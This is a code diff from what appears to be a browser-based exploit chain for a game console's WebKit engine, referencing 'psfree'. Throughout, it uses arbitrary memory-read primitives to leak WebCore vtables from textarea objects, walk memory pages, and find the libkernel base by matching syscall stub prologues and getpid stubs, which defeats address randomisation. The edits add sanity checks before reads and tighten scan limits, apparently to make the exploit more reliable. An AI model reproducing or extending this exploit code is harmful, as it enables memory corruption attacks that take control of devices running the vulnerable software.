@@ -136,8 +136,11 @@ export function checkPrologueAt(p, addr) {
     return (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f;
 }
 
-export function isLibkernelPrologue(p, lk) {
-    if (!lk || lk.hi < 0x8) return false;
+export function isLibkernelPrologue(p, lk, ctx) {
+    ctx = ctx || {};
+    if (!lk || !lkAligned(lk)) return false;
+    if (ctx.fnPtr && !plausibleLkBeforeRead(lk, ctx.fnPtr, ctx.webkitBase, ctx.off))
+        return false;
     if (checkPrologueAt(p, lk)) return true;
     if (read4p(p, lk) === SCE_MAGIC)
         return checkPrologueAt(p, lk.add32(SCE_ELF_OFF));
@@ -239,6 +242,21 @@ function resolveImportPtr(p, webkitBase, off, fnPtr, depth) {
 
 function lkAligned(lk) {
     return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
+}
+
+/** Never read prologue/walk unless lk sits just below fn in same module band. */
+function plausibleLkBeforeRead(lk, fnPtr, webkitBase, off) {
+    if (!lkAligned(lk)) return false;
+    if (lk.hi > 0x12) return false;
+    if (fnPtr) {
+        const lkB = ptrBig(lk);
+        const fnB = ptrBig(fnPtr);
+        if (fnB <= lkB) return false;
+        if (fnB - lkB > 0x600000n) return false;
+        if (lk.hi !== fnPtr.hi && Math.abs(lk.hi - fnPtr.hi) > 1) return false;
+    }
+    if (webkitBase && ptrInWebkitImage(lk, webkitBase, off)) return false;
+    return true;
 }
 
 function isSameWebkitModule(base, webkitBase, off) {
@@ -1699,11 +1717,12 @@ export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
 }
 
 /** ≤6 reads — prologue + optional getpid stub (no module walk). */
-export function verifyLibkernelBase(p, lk, off) {
+export function verifyLibkernelBase(p, lk, off, opts) {
+    opts = opts || {};
     if (!lk) return { ok: false, error: "no address" };
     if ((lk.low & 0x3fff) !== 0)
         return { ok: false, error: "not 16KB-aligned" };
-    if (!isLibkernelPrologue(p, lk))
+    if (!isLibkernelPrologue(p, lk, opts))
         return { ok: false, error: "prologue miss @ " + lk };
     const offs = getpidStubOffsets(off);
     for (let i = 0; i < offs.length; i++) {
@@ -1840,6 +1859,7 @@ function findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxPages) {
     if (page.hi >= 0x8) page = page.sub32(0x4000);
     for (let i = 0; i < maxPages; i++) {
         if (!page || page.hi < 0x8) break;
+        if (!plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
         const magic = read4p(p, page);
         if (magic != null && isModuleMagic(magic)) {
             if (!isSameWebkitModule(page, webkitBase, off))
@@ -1936,29 +1956,13 @@ function discoverTextareaVtables(p, opts) {
         vtables.push({ label: label, vtable: vtable, webcore: webcore, entry0: e0 });
     }
 
-    for (let ci = 0; ci < cells.length; ci++) {
+    const cellMax = opts.cellMax != null ? opts.cellMax : (opts.lite ? 2 : 4);
+    for (let ci = 0; ci < cells.length && ci < cellMax; ci++) {
         const path = cells[ci];
         const webcore18 = read8p(p, path.cell.add32(0x18));
         if (webcore18) {
             const vt = read8p(p, webcore18);
             if (vt) addVt(path.label + "/psfree+0x18", vt, webcore18);
-        }
-        if (opts.lite) continue;
-        const bfly = read8p(p, path.cell.add32(0x8));
-        if (bfly && bfly.hi >= 0x8) {
-            for (let slot = 0; slot < 16; slot++) {
-                const wc = read8p(p, bfly.add32(slot * 8));
-                if (!wc) continue;
-                const vt = read8p(p, wc);
-                if (vt) addVt(path.label + "/bfly" + slot, vt, wc);
-            }
-        }
-        for (let implOff = 0x8; implOff <= 0x30; implOff += 8) {
-            if (implOff === 0x18) continue;
-            const wc = read8p(p, path.cell.add32(implOff));
-            if (!wc) continue;
-            const vt = read8p(p, wc);
-            if (vt) addVt(path.label + "/impl+" + implOff.toString(16), vt, wc);
         }
     }
     return { cells: cells.length, vtables: vtables, cellDbg: cellDbg };
@@ -1970,11 +1974,11 @@ function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva, opts) {
     if (!fnPtr || fnPtr.hi < 0x8) return null;
 
     const errs = kErrorCandidates(off);
-    const errMax = opts.lite ? 2 : errs.length;
+    const errMax = opts.lite ? 1 : Math.min(2, errs.length);
     for (let i = 0; i < errMax && i < errs.length; i++) {
         const lk = fnPtr.sub32(errs[i]);
-        if (!lkAligned(lk)) continue;
-        if (!isLibkernelPrologue(p, lk)) continue;
+        if (!plausibleLkBeforeRead(lk, fnPtr, webkitBase, off)) continue;
+        if (!isLibkernelPrologue(p, lk, { fnPtr, webkitBase, off })) continue;
         if (opts.lite) {
             return {
                 lk,
@@ -1999,7 +2003,8 @@ function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva, opts) {
     if (maxWalk <= 0) return null;
 
     const walked = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxWalk);
-    if (walked && isLibkernelPrologue(p, walked)) {
+    if (walked && plausibleLkBeforeRead(walked, fnPtr, webkitBase, off)
+        && isLibkernelPrologue(p, walked, { fnPtr, webkitBase, off })) {
         const v = opts.lite ? { ok: true, strong: false } : verifyLibkernelBase(p, walked, off);
         return {
             lk: walked,
@@ -2350,7 +2355,8 @@ function scanTextareaRelroChunk(p, webkitBase, off, state, opts) {
 
     if (state.stage === "vtable") {
         let batch = 0;
-        while (batch < 6) {
+        const batchMax = opts.vtBatch != null ? opts.vtBatch : 2;
+        while (batch < batchMax) {
             if (state.vtListIdx >= state.vtables.length) break;
             const cur = state.vtables[state.vtListIdx];
             state.vtable = cur.vtable;
@@ -2464,7 +2470,7 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
             return {
                 done: false,
                 state,
-                phase: "known-done",
+                phase: c.phase === "known-skip" ? "known-skip" : "known-done",
                 tried: state.diag.known,
                 prev: c.phase,
             };
